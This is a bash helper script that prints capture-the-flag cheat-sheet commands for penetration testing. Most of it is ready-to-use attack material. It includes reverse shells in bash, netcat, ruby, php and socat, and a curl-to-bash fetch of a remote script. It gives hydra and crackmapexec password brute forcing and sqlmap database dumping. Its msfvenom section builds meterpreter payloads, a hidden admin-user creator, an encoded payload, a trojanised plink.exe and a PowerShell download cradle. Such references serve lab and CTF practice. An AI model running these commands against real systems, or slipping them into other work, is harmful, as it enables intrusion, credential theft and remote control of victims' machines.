#!/bin/bash
#TODO: gdb/volatility/tcpdump/tshark/ssh/netcat/linux/recon-ng/links
#
# Can display examples for how commands are structured
# Following commands can be used
#	- curl
#	- hydra
#	- nmap
# 	- gobuster
# 	- tty (How to upgrade a shell to tty)
#	- john
#	- ping (Set up a ping listen)
#	- find
#	- pwntools
#	- sqlmap
# 	- crackmapexec
# 	- smbclient.py
#	- mount
# Usage: ctf-ex <CMD>
#

option=$(tr '[:upper:]' '[:lower:]' <<< "$1")  # Convert command choice to lowercase

if [[ $option == "-h" || $# != 1 ]]; then
	echo "Usage: ctf-ex <CMD>
Commands implemented
	- linux
	- msfvenom
	- wfuzz
	- reverse-shell
	- nmap
	- hydra
	- curl
	- gobuster
	- crackmapexec
	- tty
	- john
	- ping
	- find
	- pwntools
	- sqlmap
	- smbclient.py
	- mount"

elif [[ $option == "linux" ]]; then
	echo "enable logging record the interactive session
	script <filename>
close script session 
	ctrl + D	
check current shell
	echo $0
all details about system 
	uname -a
view all process
	ps auxfww
check open ports and services listening
	netstat -anp
check defined hosts	
	cat /etc/hosts
check filesystem
	df -h
check crontab
	crontab -l
check initab 
	cat /etc/inittab
check shared memory 
	ipcs -mp
	"	

elif [[ $option == "crackmapexec" ]]; then
	echo "Bruteforce smb
	crackmapexec smb 10.10.10.192 -u users -p pass
Bruteforce winrm
	crackmapexec winrm 10.10.10.192 -u users -p pass"

elif [[ $option == "gobuster" ]]; then
	echo "Enumerate directories on HTTP:
	gobuster dir --wordlist /usr/share/wordlists/dirb/big.txt --url <URL> [-x <EXTENSIONS, CSV>] [-o <OUTFILE>]
Enumerate directories on HTTPS:
	gobuster dir -k --wordlist /usr/share/wordlists/dirb/big.txt --url <URL> [-x <EXTENSIONS, CSV>] [-o <OUTFILE>]
Enumerate vhosts:
	gobuster vhost --wordlist /usr/share/wordlists/SecLists/Discovery/DNS/fierce-hostlist.txt --url <URL>"

elif [[ $option == "tty" ]]; then
	echo "Fully upgrading to TTY shell
	python3 -c 'import pty; pty.spawn(\"/bin/bash\")'
	ctrl+z
	echo $TERM && tput lines && tput cols
	stty raw -echo
	fg
	export SHELL=bash
	export TERM=xterm-256color
	stty rows 24 columns 121
	Listner: socat file:`tty`,raw,echo=0 tcp-listen:4444
	Victim: socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444"

elif [[ $option == "john" ]]; then
	echo "Cracking hash
	john --wordlist=/usr/share/wordlists/rockyou.txt hash_file
john the ripper, show the cracked passwords
	john ~/hash.txt --show
john the ripper, continue session
	john --restore=session_name
john the ripper over GPU, OpenCL formats, start session
	john --session=session_name --format=opencl ~/hash.txt
	"

elif [[ $option == "mount" ]]; then
	echo "Mount a shared folder
	mount -t cifs -o username=user,password=password //x.x.x.x/share /mnt/share"

elif [[ $option == "ping" ]]; then
	echo "Setting up listener for pings
	tcpdump -i tun0 icmp and icmp[icmptype]=icmp-echo"

elif [[ $option == "find" ]]; then
	echo "Finding a file and dismissing permission denied messages
	find / -type f -name \"keyword\" 2>&1 | grep -v \"Permission denied\"
Finding all SUID and SGID files in the file system
	find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
Finding all readable by user files 
	find / -type f -readable
Finding all writable by user files
	find / -type d -writable 
Find all files with the word password in them 
	find / -name '*{password}*' -print	
	"

elif [[ $option == "pwntools" ]]; then
	echo "Making a remote connection
	io = remote('ip', port)
Setting debug mode
	context.log_level = 'DEBUG'
Pattern generation
	cyclic(x)
Pattern Finding
	cyclic_find(0xadress)
URL encoding
	urlencode(\"string\")
packing to big-endian
	pack(1, endian='big')
loading ELF files
	e = ELF('/path/to/file')		
more details
	https://github.com/Gallopsled/pwntools-tutorial
	"

elif [[ $option == "smbclient.py" ]]; then
	echo "Login
	smbclient.py DOMAIN/USERNAME:PASS@IP"

elif [[ $option == "sqlmap" ]]; then
	echo "SQLi testing from saved request from burp
	sqlmap --level 5 --risk 3 --batch -r <FILE>
SQLi from GET request
	sqlmap --level 5 --risk 3 --batch -u <URL>
SQLI for specefic parameters	
	sqlmap --level 5 --risk 3 --batch -u <URL> --method \"POST\" --data=\"parm_1=value&param_n=value\"
GET SQL Shell
	sqlmap --dbms=mysql -u \"<URL>\" --sql-shell
LIST all databases
	sqlmap -u \"<URL>\" --dbs
LIST all tables in a database
	sqlmap -u \"<URL>\" -D site_db --tables	
Dump the contents of a DB table
	sqlmap -u \"http://testsite.com/login.php\" -D site_db -T users –dump
List all columns in a table
	sqlmap -u \"http://testsite.com/login.php\" -D site_db -T users --columns
Test on page that require login	
	sqlmp --cookie=\"value=X\" -u \"http://testsite.com/sell.php
Add headers to the query 
	sqlmp --headers=\"header:value;header:value\" -u \"http://testsite.com/sell.php
	"
elif [[ $option == "curl" ]]; then
	echo "POST parameters
	curl --data \"email=test@test.com&password=test\" <URL>
Specify user agent
	curl -A \"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)\" <URL>
OUTPUT response header to stdout 
	curl -i http://10.10.10.10/profile.php
Follow redirect 302
	curl -L http://10.10.10.10/profile.php		
Pipe a remote script directly to bash 
	curl -sSk \"http://10.10.10.10/linpeas.sh\" | bash
Adding additonal headrs 
	curl -H \"X-Header: value\" <URL>
	"

elif [[ $option == "hydra" ]]; then 
	echo "Brute windows RDP
	hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip
Brute SMB users with rockyou
	hydra -L usernames.txt -P passwords.txt $ip smb -V -f
Brute LDAP users with rockyou.txt 
	hydra -L users.txt -P passwords.txt $ip ldap2 -V -f
Brute HTTP GET login
	hydra -L ./webapp.txt -P ./webapp.txt $ip http-get /admin
Bute ssh on port 22
	hydra $ip -s 22 ssh -l -P big_wordlist.txt
Brute ssh using list of users and passwords 
	hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u $ip ssh
Check more here:
	https://redteamtutorials.com/2018/10/25/hydra-brute-force-techniques/			
	"	
elif [[ $option == "nmap" ]]; then
	echo "Scan from predifined list
	nmap -iL list.txt
scan top X ports
	nmap –top-ports X 192.168.1.1
scan all 65535 ports 
	nmap -p- 192.168.1.1
scan a subnet 
	nmap 192.168.1.0/24	
scan selected ports and ignore discorvery 
	nmap -Pn -F 192.168.1.1
scan using tcp connect 
	nmap -sT 192.168.1.1
aggressive service detection
	nmap -sV --version-intensity 5 192.168.1.1
ligher banner grabbing detection
	nmap -sV --version-intensity 0 192.168.1.1
Scan with a set of scripts
	nmap -sV --script=smb* 192.168.1.1
use diminutive fragmented IP packets
	nmap -f 192.168.1.1
Specify the size (need to be multiple of 16)
	nmap --mtu 16 192.168.1.1
use firewall bypass script
	nmap -sS -T5 192.168.1.1 --script firewall-bypass
list nmap scripts
	ls -la /usr/share/nmap/scripts/			
	"
elif [[ $option == "reverse-shell" ]]; then
	echo "bash reverse-shell
	bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
netcat
	nc -e /bin/sh 10.0.0.1 1234
ruby 
	ruby -rsocket -e'f=TCPSocket.open(\"10.0.0.1\",1234).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'
php	
	php -r '$sock=fsockopen(\"10.0.0.1\",1234);exec(\"/bin/sh -i <&3 >&3 2>&3\");'	
weevely web shell
	weevely generate <password> <path>
	weevely <URL> password
"

elif [[ $option == "wfuzz" ]]; then 
	echo "URL brute forcing
	wfuzz -c -z /path/to/wordlist.txt --hc 404 http://<host>/FUZZ
GET params brute forcing
	wfuzz -c -z file,users.txt -z file,pass.txt --hc 404 http://<host>/index.php?user=FUZZ&pass=FUZ2Z
POST params brute forcing 
	wfuzz -z file,wordlist/others/common_pass.txt -d \"uname=FUZZ&pass=FUZZ\"  --hc 302 http://testphp.vulnweb.com/userinfo.php	
Encoding payloads
	wfuzz -z list,1-2-3,md5-sha1-none http://webscantest.com/FUZZ
Fuzz custom headers
	wfuzz -z file,wordlist/general/common.txt -H \"myheader: headervalue\" -H \"myheader2: headervalue2\" <URL> 
	"

elif [[ $option == "msfvenom" ]]; then 
	echo "List payloads
	msfvenom -l payloads
List encoders
	msfvenom -l encoders
windows meterpreter reverse-shell
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe
windows create user
	msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe		
Execute commands 
	msfvenom -a x86 --platform Windows -p windows/exec CMD=\"powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"\" -f python	
Encoding a reverse-shell with shikata_ga_nai
	msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
embedded reverse-shell inside exe
	msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe		
PHP reverse-shell
	msfvenom -p php/reverse_php LHOST=IP LPORT=PORT -f raw > phpreverseshell.php
Python shell
	msfvenom -p cmd/unix/reverse_python LHOST=IP LPORT=PORT -f raw > shell.py
Linux meterpreter bind shell x86 multi stage
	msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf		
	"		 
fi